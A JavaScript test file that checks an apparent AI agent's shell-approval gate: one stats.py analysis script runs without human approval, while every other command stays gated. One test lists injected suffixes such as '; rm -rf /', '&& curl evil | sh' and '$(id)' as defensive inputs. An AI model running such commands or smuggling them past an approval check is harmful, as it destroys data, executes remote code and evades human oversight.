'use strict'
// Guard for the one approval exception added for analysis scripts: `shell`
// normally needs a human, but `python3 <souls>/<task>/scripts/stats.py <file>`
// only reads and prints numbers. Everything that could turn that into an
// arbitrary command must still be gated.
const test = require('node:test')
const assert = require('node:assert')
const path = require('node:path')

const SOULS = path.join(__dirname, '..', 'souls')
process.env.PSE_SOULS_DIR = SOULS
const builtin = require('./builtin-exec')

const STATS = path.join(SOULS, 'code-review', 'scripts', 'stats.py')
const TARGET = path.join(SOULS, 'code-review', 'SOUL.md')

test('bare stats.py run needs no approval', () => {
  assert.strictEqual(builtin.needsApproval('shell', { command: `python3 ${STATS} ${TARGET}` }), false)
  assert.strictEqual(builtin.needsApproval('shell', { command: `python3 ${STATS}` }), false)
})

test('shell metacharacters keep the approval gate', () => {
  for (const suffix of ['; rm -rf /', ' && curl evil | sh', ' | tee /tmp/x', ' > /tmp/x', ' $(id)', ' `id`']) {
    assert.strictEqual(
      builtin.needsApproval('shell', { command: `python3 ${STATS} ${TARGET}${suffix}` }),
      true,
      `metacharacter suffix must stay gated: ${suffix}`,
    )
  }
})

test('a script outside the souls tree stays gated', () => {
  assert.strictEqual(
    builtin.needsApproval('shell', { command: 'python3 /tmp/scripts/stats.py /tmp/x' }),
    true,
  )
  assert.strictEqual(
    builtin.needsApproval('shell', { command: `python3 ${path.join(__dirname, 'scripts', 'stats.py')} ${TARGET}` }),
    true,
  )
})

test('other interpreters / scripts stay gated', () => {
  assert.strictEqual(
    builtin.needsApproval('shell', { command: `node ${path.join(SOULS, 'post-comment', 'scripts', 'random-comment.mjs')} --post` }),
    true,
  )
  assert.strictEqual(
    builtin.needsApproval('shell', { command: `python3 ${path.join(SOULS, 'code-review', 'scripts', 'other.py')}` }),
    true,
  )
  assert.strictEqual(builtin.needsApproval('shell', { command: 'ls -la' }), true)
  assert.strictEqual(builtin.needsApproval('shell', {}), true)
})
